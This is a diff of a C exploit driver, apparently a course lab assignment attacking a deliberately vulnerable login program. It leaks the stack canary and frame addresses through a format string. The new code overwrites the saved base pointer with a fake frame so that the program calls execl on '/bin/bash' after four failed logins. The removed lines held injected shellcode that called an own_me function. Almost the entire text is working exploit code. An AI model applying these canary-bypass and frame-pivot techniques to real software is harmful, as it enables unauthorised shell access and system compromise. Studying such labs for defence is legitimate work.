@@ -127,25 +127,36 @@ int main(int argc, char* argv[]) {
 
    // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
    // to figure out and populate the following values
-   void *ownme_addr = (void*) 0x804b1dd;     // address of own_me
-   void *mainloop_ra = (void*) 0x804b652;    // return address for main_loop
-   void *mainloop_bp = (void*) 0xbffff018;   // saved ebp for main_loop
-   void *auth_bp = (void*) 0xbfffe5f8;       // saved ebp for auth function
+   void *mainloop_ra = (void*) 0x0804b652; // return address for main_loop
+   void *mainloop_bp = (void*) 0xbffff008; // saved ebp for main_loop
+   void *auth_ra = (void*) 0x08048968;     // return address for auth
+   void *auth_bp = (void*) 0xbfffe5e8;     // saved ebp for auth function
 
    // The following refer to locations on the stack
-   void *auth_ra_loc = (void*) 0xbfffe5cc;     // location of auth's return address
-   void *auth_bp_loc = (void*) 0xbfffe5c8;     // location of auth's saved bp   
-   void *auth_canary_loc = (void*) 0xbfffe5bc; // location where auth's canary is stored
-   void *auth_user = (void*) 0xbfffe3b0;       // value of user variable in auth
+   void *auth_ra_loc = (void*) 0xbfffe5bc; // location of auth's return address
+   void *auth_bp_loc = (void*) 0xbfffe5b8; // location of auth's saved bp   
+   void *auth_canary_loc = (void*) 0xbfffe5ac; // location where auth's canary is stored
+   void *auth_user = (void*) 0xbfffe3b0;   // value of user variable in auth (auth loc)
+            // OR  = 0xbfffe5a4 (address of that value)
+   void *g_s2_loc = (void*) 0xbfffe5dc; // location of s2 in g
+            // OR 0xbffff020 (pointer to actual string)
 
    // These values discovered above using GDB will vary across the runs, but the
    // differences between similar variables are preserved, so we compute those.
+   
+   // To get value of auth's RA
+   unsigned mainloop_auth_ra_diff = mainloop_ra - auth_ra;
    unsigned mainloop_auth_bp_diff = mainloop_bp - auth_bp;
-   unsigned mainloop_ownme_diff = ownme_addr - mainloop_ra;
+
+   // To get locations of Gs2 
+   unsigned mainloop_ra_g_s2_diff = g_s2_loc - mainloop_ra;
+
+   // To get indicies to put exploit canary, BP, and RA
    unsigned auth_canary_user_diff = auth_canary_loc - auth_user;
-   unsigned auth_bp_loc_user_diff = auth_bp_loc - auth_user;
+   unsigned auth_bp_user_diff = auth_bp_loc - auth_user;
    unsigned auth_ra_user_diff = auth_ra_loc - auth_user;
-   unsigned auth_bp_user_diff = auth_bp - auth_user;
+
+
 
    // Use GDB + trial&error to figure out the correct offsets where the:
    // the stack canary
@@ -161,35 +172,23 @@ int main(int argc, char* argv[]) {
 
    // Once all of the above information has been populated, you are ready to run
    // the exploit.
-
    unsigned cur_canary, cur_mainloop_bp, cur_mainloop_ra;
    get_formatted("%x%x%x", &cur_canary, &cur_mainloop_bp, &cur_mainloop_ra);
-   fprintf(stderr, "driver: Extracted ML canary=%x, bp=%x, ra=%x\n", 
+   fprintf(stderr, "driver: Extracted canary=%x, bp=%x, ra=%x\n", 
            cur_canary, cur_mainloop_bp, cur_mainloop_ra);
 
-   // Use RA to compute location of ownme and generate exploit code.
-   char code_template[] =
-      "\xB8\x00\x00\x00\x00"  /* mov $<ownme_addr>, %eax */
-      "\xFF\xD0"              /* call *%eax */
-      "\x31\xC0"              /* xor %eax, %eax (sets return value) */
-      "\x68\x00\x00\x00\x00"  /* push $<cur_main_ra> */
-      "\xC3"                  /* ret */
-   ;
 
-   unsigned cur_ownme_addr = cur_mainloop_ra + mainloop_ownme_diff;
-   
-   memcpy((char*)code_template + 1, &cur_ownme_addr, sizeof(unsigned));
-   memcpy((char*)code_template + 10, &cur_mainloop_ra, sizeof(unsigned));
-   
-   fprintf(stderr, "driver: Code generated. Ownme addr=%x\n", cur_ownme_addr);
+
+
+
+
 
    // Allocate and prepare a buffer that contains the exploit string.
-   // The exploit starts at auth's user and should go until the argument
-   // ulen, which is 3 words past auth's RA. Therefore, the size of the 
-   // buffer is auth_ra_user_diff + 4 * sizeof(void*)
-   unsigned explsz = auth_ra_user_diff + 4 * sizeof(void*);
-   void** expl = (void**)malloc(explsz);
-
+   // The exploit starts at auth's user, and should go until g's authd, so
+   // allocate an exploit buffer of size g_authd_auth_user_diff+sizeof(authd)
+   unsigned explsz = auth_ra_user_diff + sizeof(auth_ra) + 6;
+   void* *expl = (void**)malloc(explsz);
+   fprintf(stderr, "Size of expbuf=%d\n", explsz);
    // Initialize the buffer with '\0', just to be on the safe side.
    memset((void*)expl, '\0', explsz);
 
@@ -198,23 +197,55 @@ int main(int argc, char* argv[]) {
    // being assembled on the same architecture/OS as the process being
    // exploited.
 
-   unsigned saved_bp = cur_mainloop_bp - mainloop_auth_bp_diff;
-
    // Compute current location of auth user
-   unsigned cur_user_addr = saved_bp - auth_bp_user_diff;
-   fprintf(stderr, "driver: Current user addr=%x\n", cur_user_addr);
+   unsigned auth_saved_bp = cur_mainloop_bp - mainloop_auth_bp_diff;
+   unsigned cur_auth_user_loc = auth_saved_bp - auth_bp_user_diff;
+   fprintf(stderr, "driver: Current user addr=%x\n", cur_auth_user_loc);
+   // // Get g's current s2 location
+   unsigned cur_g_s2_loc = mainloop_ra_g_s2_diff + cur_mainloop_ra;
+  // fprintf(stderr, "Auth's cur user loc=%x\n", cur_auth_user_loc);
+  // fprintf(stderr, "G's cur s2 loc=%x\n", cur_g_s2_loc);
 
-   // Add code to call ownme
-   memcpy(expl, code_template, sizeof(code_template));
-   // Add auth's canary
+
+
+
+
+   // Add auth's canary:
    expl[auth_canary_user_diff/sizeof(void*)] = (void*)cur_canary;
-   // Add auth's saved BP
-   expl[auth_bp_loc_user_diff/sizeof(void*)] = (void*)saved_bp;
-   // Set ulen (3 words past bp) to zero so strncmp doesn't segfault
-   expl[auth_bp_loc_user_diff + 3/sizeof(void*)] = (void*)0;
-   // Change auth's RA to the address where we injected our code (addr of user)
-   expl[auth_ra_user_diff/sizeof(void*)] = (void*)cur_user_addr;
+   // Add auth's original RA:
+   expl[auth_ra_user_diff/sizeof(void*)] = 
+     (void*)(cur_mainloop_ra - mainloop_auth_ra_diff);
+   // // Add auth's original saved BP
+   // expl[auth_bp_user_diff/sizeof(void*)] = (void*)auth_saved_bp;
+  
+   // 1. Add the string '/bin/bash' to the buffer (10 chars = first 3 words)
+   strcpy(expl, "/bin/bash");
 
+   // // 2. Add a pointer to this string's location to the buffer (4th word)
+   expl[3] = (void *)cur_auth_user_loc; // BP-12 (s2)
+   //expl[4] = (void *)cur_auth_user_loc; // BP-16 (s1)
+
+   // 3. Make auth's saved BP point to fake BP
+   // s1 pointer is at BP-16 and s2 pointer is at BP-12
+   unsigned fake_BP = cur_auth_user_loc + (6*sizeof(void*));
+   expl[auth_bp_user_diff/sizeof(void*)] = (void *)fake_BP;
+   // fprintf(stderr, "Original AUTH BP=%x\n", (void*)(cur_mainloop_bp - mainloop_auth_bp_diff));
+   // fprintf(stderr, "NEW AUTH BP=%x\n", fake_BP);
+
+   // 4. Login incorrectly 4 times to trigger execl of s2
+   fprintf(stderr, "********* Incorrectly Logging In 4 Times: *********\n");
+   int i=0;
+   for (i; i<4; i++) {
+      put_str("p 360\n");
+      send();
+      put_str("u CSE\n");
+      send();
+      put_str("l \n");
+      send();
+   }
+   fprintf(stderr, "***************************************************\n");
+
+   
    // Now, send the payload
    put_str("p xyz\n");
    send();
@@ -222,7 +253,6 @@ int main(int argc, char* argv[]) {
    put_bin((char*)expl, explsz);
    put_str("\n");
    send();
-
    put_str("l \n");
    send();
 
